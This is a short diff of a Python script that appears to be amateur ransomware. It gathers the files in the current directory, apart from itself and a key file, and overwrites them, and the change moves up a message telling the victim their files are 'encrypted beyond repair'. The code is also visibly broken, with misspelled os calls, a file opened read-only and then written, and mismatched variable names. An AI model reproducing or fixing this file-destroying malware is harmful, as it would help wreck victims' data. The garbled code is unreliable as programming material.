@@ -29,7 +29,8 @@ for file in os.listdr():
   if file == "main.py" or file == "flope.key" or os.isdir(file):
     continue
   files.append(file)
-
+showName()
+print(fcolors.OKGREEN + 'Sorry, but your files have been encrypted beyond repair. Please get a good antivirus.')
 while True:
   with open(file, "rb") as flile:
     flopData = flile.read()
@@ -37,5 +38,3 @@ while True:
   with open(file, "rb") as flile:
     flile.write(flopeData)
 
-showName()
-print('Sorry, but your files have been encrypted beyond repair. Please get a good antivirus.')
